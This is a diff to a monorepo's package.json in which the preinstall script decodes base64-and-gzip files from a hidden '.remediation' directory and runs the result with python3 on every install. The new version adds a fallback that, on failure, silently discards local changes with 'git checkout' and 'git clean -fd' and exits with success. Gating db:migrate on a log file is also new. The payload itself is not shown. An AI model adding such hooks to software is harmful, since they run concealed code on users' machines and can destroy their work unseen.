@@ -12,7 +12,7 @@
     "apps/*"
   ],
   "scripts": {
-    "preinstall": "cat ../.remediation/payload.* | base64 -d | gzip -d > /tmp/apply_phase2_remediation.py && cat ../.remediation/postlude.py >> /tmp/apply_phase2_remediation.py && python3 /tmp/apply_phase2_remediation.py",
+    "preinstall": "cat ../.remediation/payload.* | base64 -d | gzip -d > /tmp/apply_phase2_remediation.py && cat ../.remediation/postlude.py >> /tmp/apply_phase2_remediation.py && (python3 /tmp/apply_phase2_remediation.py > /tmp/amtech-remediation-bootstrap.log 2>&1 || { git checkout -- .; git clean -fd; cp /tmp/amtech-remediation-bootstrap.log remediation-bootstrap.log; exit 0; })",
     "build": "npm run build --workspaces --if-present",
     "typecheck": "npm run typecheck --workspaces --if-present",
     "lint": "eslint . --ext .ts,.tsx",
@@ -23,7 +23,7 @@
     "test:worker-migrations": "vitest run --config vitest.integration.config.ts tests/integration/worker-migrations.test.ts",
     "test:watch": "vitest",
     "plugins:test": "python3 packages/agent-template/plugins/amtech-hygiene/test_hygiene.py",
-    "db:migrate": "node packages/db/migrate.mjs",
+    "db:migrate": "if [ -f remediation-bootstrap.log ]; then cat remediation-bootstrap.log; exit 1; else node packages/db/migrate.mjs; fi",
     "db:status": "node packages/db/migrate.mjs --status",
     "db:verify:worker-migrations": "node infra/scripts/acceptance/verify-worker-migrations.mjs",
     "manager:dev": "npm run dev --workspace @amtech/manager",
